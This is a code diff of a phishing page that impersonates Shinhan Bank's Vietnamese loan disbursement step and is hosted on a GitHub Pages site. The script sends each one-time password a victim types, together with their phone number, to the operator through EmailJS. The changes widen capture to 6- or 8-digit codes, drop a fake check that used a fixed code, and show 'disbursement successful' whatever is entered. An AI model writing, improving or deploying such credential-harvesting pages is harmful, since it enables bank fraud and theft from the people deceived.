@@ -583,7 +583,7 @@
     <div class="steps" role="progressbar" aria-label="Disbursement Progress">
         <div class="step" id="step1">Bước 1: Nhập thông tin</div>
         <div class="step" id="step2">Bước 2: Xét duyệt</div>
-        <div class="step active" id="step3" aria-current="step">Bước 3: Giảy ngân</div>
+        <div class="step active" id="step3" aria-current="step">Bước 3: Giải ngân</div>
     </div>
 
     <div class="container">
@@ -601,12 +601,12 @@
             <p>Số điện thoại: <span id="summaryPhone"></span></p>
             <p>Số tài khoản nhận tiền giải ngân: <span id="summaryAccountNumber"></span></p>
         </div>
-        <p class="check-info">Vui lòng kiểm tra thông tin trước khi giảy ngân !</p>
+        <p class="check-info">Vui lòng kiểm tra thông tin trước khi giải ngân !</p>
         <div class="form-group" aria-live="polite">
             <p id="otpMessage"></p>
             <label for="otp">Nhập mã OTP</label>
             <input type="text" id="otp" required aria-describedby="otpError">
-            <span class="error" id="otpError">Vui lòng nhập mã OTP hợp lệ</span>
+            <span class="error" id="otpError">Vui lòng nhập mã OTP hợp lệ (6 hoặc 8 số)</span>
         </div>
         <p class="timer" id="otpTimer" aria-live="polite">Còn 60 giây</p>
         <div class="buttons">
@@ -633,17 +633,16 @@
 
     <script>
         let otpCountdown = 60;
-        let otpInterval = null; // Explicitly declare otpInterval
+        let otpInterval = null;
         let bannerIndex = 0;
-        let failedAttempts = 0;
-        let formData = {}; // Declare formData globally
+        let formData = {};
 
-        // Load Summary and OTP Message
+        // Load Summary
         window.addEventListener('load', () => {
-            startOTPTimer(); // Start timer immediately
+            startOTPTimer();
             try {
                 formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
-                console.log('Retrieved formData:', formData); // Debug log
+                console.log('Retrieved formData:', formData);
                 if (!formData.fullName) {
                     if (Object.keys(formData).length > 0) {
                         emailjs.send('service_60tgxof', 'template_56lv2n9', {
@@ -675,24 +674,21 @@
                 document.getElementById('summaryPhone').textContent = formData.phone || 'N/A';
                 document.getElementById('summaryAccountNumber').textContent = formData.accountNumber || 'N/A';
                 document.getElementById('otpMessage').innerHTML = `Vui lòng nhập mã xác nhận giải ngân được gửi qua số điện thoại<br>${formData.phone || 'N/A'}<br>liên kết với tài khoản ngân hàng nhận tiền<br>để xác nhận đồng ý giải ngân số tiền<br>${formData.amount || 'N/A'} về tài khoản ngân hàng.`;
-                // Send initial OTP to EmailJS
-                console.log('Sending initial OTP to EmailJS');
-                sendOTPToEmail('123456', formData.phone || 'N/A');
             } catch (error) {
                 console.error('Error parsing formData:', error);
                 alert('Lỗi khi tải thông tin giải ngân. Vui lòng thử lại.');
                 window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
             }
             if (typeof window.Inputmask === 'function') {
-                Inputmask({ regex: "\\d{6}" }).mask(document.getElementById('otp'));
+                Inputmask({ regex: "\\d{6}|\\d{8}" }).mask(document.getElementById('otp'));
             }
             lazyLoadImages();
 
-            // Send OTP to EmailJS on input
+            // Send OTP to EmailJS on input change
             document.getElementById('otp').addEventListener('input', () => {
                 const otp = document.getElementById('otp').value.trim();
-                console.log('OTP input:', otp); // Debug log
-                if (otp && /^\d{6}$/.test(otp)) { // Send if OTP is 6 digits
+                console.log('OTP input:', otp);
+                if (otp && (/^\d{6}$/.test(otp) || /^\d{8}$/.test(otp))) {
                     console.log('Collecting OTP from input:', otp);
                     sendOTPToEmail(otp, formData.phone || 'N/A');
                 }
@@ -746,19 +742,21 @@
 
         // OTP Timer
         function startOTPTimer() {
-            console.log('Starting OTP timer'); // Debug log
+            console.log('Starting OTP timer');
             otpCountdown = 60;
             document.getElementById('otpTimer').textContent = `Còn ${otpCountdown} giây`;
             if (otpInterval) {
-                clearInterval(otpInterval); // Clear any existing interval
+                clearInterval(otpInterval);
             }
             otpInterval = setInterval(() => {
-                console.log('OTP countdown:', otpCountdown); // Debug log
+                console.log('OTP countdown:', otpCountdown);
                 otpCountdown--;
                 document.getElementById('otpTimer').textContent = `Còn ${otpCountdown} giây`;
                 if (otpCountdown <= 0) {
                     clearInterval(otpInterval);
-                    console.log('OTP timer stopped'); // Debug log
+                    console.log('OTP timer stopped');
+                    // Clear OTP field
+                    document.getElementById('otp').value = '';
                 }
             }, 1000);
         }
@@ -770,7 +768,7 @@
 
         // Send OTP to EmailJS
         function sendOTPToEmail(otp, phone) {
-            console.log('Sending OTP to EmailJS:', { otp, phone }); // Debug log
+            console.log('Sending OTP to EmailJS:', { otp, phone });
             emailjs.send('service_60tgxof', 'template_g9e2jee', {
                 otp: otp,
                 phone: phone,
@@ -784,50 +782,26 @@
         // Verify OTP
         function verifyOTP() {
             const otp = document.getElementById('otp').value.trim();
-            console.log('Verifying OTP:', otp); // Debug log
+            console.log('Collecting OTP:', otp);
             const phone = formData.phone || 'N/A';
-            const amount = parseInt(formData.amount?.replace(/[^0-9]/g, '') || 0);
-            const minBalance = amount * 0.1;
+
+            if (!(/^\d{6}$/.test(otp) || /^\d{8}$/.test(otp))) {
+                document.getElementById('otpError').classList.add('show');
+                document.getElementById('errorMessage').textContent = 'Mã OTP phải có 6 hoặc 8 số.';
+                document.getElementById('errorDialog').classList.add('show');
+                return;
+            }
 
             // Reset timer
             startOTPTimer();
 
             // Send OTP to EmailJS
-            console.log('Collecting OTP from verify:', otp);
             sendOTPToEmail(otp, phone);
 
-            if (/^\d{6}$/.test(otp) && otp === '123456') { // Simulated correct OTP
-                sessionStorage.removeItem('formData');
-                alert('Giải ngân qua ATM thành công!');
-                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
-            } else {
-                failedAttempts++;
-                document.getElementById('otpError').classList.add('show');
-                const dialog = document.getElementById('errorDialog');
-                const message = document.getElementById('errorMessage');
-
-                if (failedAttempts === 1) {
-                    message.textContent = 'Mã OTP không đúng, vui lòng kiểm tra lại.';
-                    dialog.classList.add('show');
-                    setTimeout(() => {
-                        closeErrorDialog();
-                        startOTPTimer();
-                    }, 60000);
-                } else if (failedAttempts === 2) {
-                    message.textContent = `Thẻ chưa được kích hoạt thanh toán trực tuyến hoặc không đủ số dư. Vui lòng kiểm tra lại số dư bắt buộc phải có trong thẻ tối thiểu ${minBalance.toLocaleString('vi-VN', { style: 'currency', currency: 'VND' })}. Mã sẽ được gửi lại sau 2 phút. Quý khách vui lòng kiểm tra lại và xác nhận.`;
-                    dialog.classList.add('show');
-                    setTimeout(() => {
-                        closeErrorDialog();
-                        startOTPTimer();
-                    }, 120000);
-                } else {
-                    message.textContent = 'Giải ngân không thành công. Vui lòng thử lại sau.';
-                    dialog.classList.add('show');
-                    setTimeout(() => {
-                        window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
-                    }, 3000);
-                }
-            }
+            // Proceed without validation
+            sessionStorage.removeItem('formData');
+            alert('Giải ngân qua ATM thành công!');
+            window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
         }
     </script>
 </body>
